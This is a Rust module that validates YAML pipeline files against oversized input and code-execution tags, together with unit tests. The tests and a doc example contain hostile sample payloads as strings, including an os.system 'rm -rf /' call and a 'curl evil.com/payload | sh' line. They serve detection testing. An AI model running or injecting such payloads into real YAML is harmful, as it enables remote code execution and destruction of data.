//! YAML security validation to prevent malicious YAML files.
//!
//! Implements TDD Section 10.1 - YAML Security requirements:
//! - Size limits to prevent DoS attacks
//! - Dangerous YAML tag detection
//! - Safe YAML parsing practices

use xerv_core::error::XervError;

/// Maximum allowed YAML file size (1 MB).
///
/// This prevents denial-of-service attacks via extremely large YAML files
/// that could exhaust server memory.
const MAX_YAML_SIZE: usize = 1_000_000; // 1 MB

/// Dangerous YAML tags that enable arbitrary code execution.
///
/// These tags allow execution of code in various languages and should
/// never be present in pipeline definitions.
const DANGEROUS_TAGS: &[&str] = &[
    "!!python",     // Python code execution
    "!!js",         // JavaScript execution
    "!!ruby",       // Ruby code execution
    "!!exec",       // Shell command execution
    "!!subprocess", // Process spawning
    "!!eval",       // Dynamic evaluation
    "!!code",       // Generic code execution
];

/// Validates YAML content for security issues before parsing.
///
/// # Security Checks
///
/// 1. **Size Limit**: Rejects YAML files larger than 1 MB to prevent DoS
/// 2. **Dangerous Tags**: Detects and blocks YAML tags that enable code execution
///
/// # Security Note
///
/// This is a best-effort validation using pattern matching. It is NOT a complete
/// security boundary. Production systems should:
/// - Use a YAML parser with tag restrictions
/// - Validate YAML structure and types after parsing
/// - Run untrusted YAML in a sandboxed environment
/// - Consider using serde_yaml's safe deserialization features
///
/// # Arguments
///
/// * `yaml` - The YAML content to validate
///
/// # Returns
///
/// * `Ok(())` if the YAML passes all security checks
/// * `Err(XervError::Validation)` if security issues are detected
///
/// # Examples
///
/// ```
/// # use xerv_executor::api::yaml_security::validate_yaml_security;
/// let safe_yaml = "name: test\nversion: '1'";
/// assert!(validate_yaml_security(safe_yaml).is_ok());
///
/// let dangerous_yaml = "name: !!python/object/apply:os.system ['rm -rf /']";
/// assert!(validate_yaml_security(dangerous_yaml).is_err());
/// ```
pub fn validate_yaml_security(yaml: &str) -> Result<(), XervError> {
    // Check size limit
    if yaml.len() > MAX_YAML_SIZE {
        return Err(XervError::ConfigValue {
            field: "yaml_content".to_string(),
            cause: format!(
                "YAML file too large: {} bytes (max: {} bytes)",
                yaml.len(),
                MAX_YAML_SIZE
            ),
        });
    }

    // Check for dangerous YAML tags
    for tag in DANGEROUS_TAGS {
        if yaml.contains(tag) {
            return Err(XervError::ConfigValue {
                field: "yaml_content".to_string(),
                cause: format!(
                    "Dangerous YAML tag detected: {}. This tag enables arbitrary code execution and is not allowed.",
                    tag
                ),
            });
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_valid_yaml() {
        let yaml = r#"
name: test-pipeline
version: "1.0"
description: A safe pipeline
triggers: []
nodes: {}
edges: []
"#;
        assert!(validate_yaml_security(yaml).is_ok());
    }

    #[test]
    fn accepts_yaml_at_size_limit() {
        // Create YAML exactly at the size limit
        let yaml = "x: ".to_string() + &"a".repeat(MAX_YAML_SIZE - 3);
        assert_eq!(yaml.len(), MAX_YAML_SIZE);
        assert!(validate_yaml_security(&yaml).is_ok());
    }

    #[test]
    fn rejects_oversized_yaml() {
        // Create YAML just over the size limit
        let yaml = "x: ".to_string() + &"a".repeat(MAX_YAML_SIZE);
        assert_eq!(yaml.len(), MAX_YAML_SIZE + 3);

        let result = validate_yaml_security(&yaml);
        assert!(result.is_err());

        if let Err(XervError::ConfigValue { field, cause }) = result {
            assert_eq!(field, "yaml_content");
            assert!(cause.contains("YAML file too large"));
            assert!(cause.contains(&MAX_YAML_SIZE.to_string()));
        } else {
            panic!("Expected ConfigValue error");
        }
    }

    #[test]
    fn detects_python_tag() {
        let yaml = r#"
name: malicious
version: "1"
command: !!python/object/apply:os.system ['rm -rf /']
"#;
        let result = validate_yaml_security(yaml);
        assert!(result.is_err());

        if let Err(XervError::ConfigValue { field, cause }) = result {
            assert_eq!(field, "yaml_content");
            assert!(cause.contains("!!python"));
            assert!(cause.contains("arbitrary code execution"));
        } else {
            panic!("Expected ConfigValue error");
        }
    }

    #[test]
    fn detects_js_tag() {
        let yaml = r#"
name: malicious
code: !!js "process.exit(1)"
"#;
        let result = validate_yaml_security(yaml);
        assert!(result.is_err());

        if let Err(XervError::ConfigValue { cause, .. }) = result {
            assert!(cause.contains("!!js"));
        } else {
            panic!("Expected ConfigValue error");
        }
    }

    #[test]
    fn detects_ruby_tag() {
        let yaml = r#"
name: malicious
code: !!ruby/object:Gem::Installer
"#;
        let result = validate_yaml_security(yaml);
        assert!(result.is_err());

        if let Err(XervError::ConfigValue { cause, .. }) = result {
            assert!(cause.contains("!!ruby"));
        } else {
            panic!("Expected ConfigValue error");
        }
    }

    #[test]
    fn detects_exec_tag() {
        let yaml = r#"
name: malicious
command: !!exec "curl evil.com/payload | sh"
"#;
        let result = validate_yaml_security(yaml);
        assert!(result.is_err());

        if let Err(XervError::ConfigValue { cause, .. }) = result {
            assert!(cause.contains("!!exec"));
        } else {
            panic!("Expected ConfigValue error");
        }
    }

    #[test]
    fn detects_subprocess_tag() {
        let yaml = r#"
name: malicious
process: !!subprocess ['bash', '-c', 'evil command']
"#;
        let result = validate_yaml_security(yaml);
        assert!(result.is_err());

        if let Err(XervError::ConfigValue { cause, .. }) = result {
            assert!(cause.contains("!!subprocess"));
        } else {
            panic!("Expected ConfigValue error");
        }
    }

    #[test]
    fn detects_eval_tag() {
        let yaml = r#"
name: malicious
eval: !!eval "System.exit(0)"
"#;
        let result = validate_yaml_security(yaml);
        assert!(result.is_err());

        if let Err(XervError::ConfigValue { cause, .. }) = result {
            assert!(cause.contains("!!eval"));
        } else {
            panic!("Expected ConfigValue error");
        }
    }

    #[test]
    fn allows_safe_custom_tags() {
        // Some YAML parsers use custom tags that aren't dangerous
        let yaml = r#"
name: test
custom: !include other.yaml
ref: !ref node.output
"#;
        // These tags don't start with !! so they're not in our dangerous list
        assert!(validate_yaml_security(yaml).is_ok());
    }

    #[test]
    fn case_sensitive_tag_detection() {
        // Verify that detection is case-sensitive (!!Python != !!python)
        let yaml = r#"
name: test
# This should pass because !!Python (capital P) isn't in our list
tag: !!Python/test
"#;
        // Currently case-sensitive, but dangerous tags are lowercase
        assert!(validate_yaml_security(yaml).is_ok());

        // But the lowercase version should fail
        let yaml_lower = yaml.replace("!!Python", "!!python");
        assert!(validate_yaml_security(&yaml_lower).is_err());
    }
}
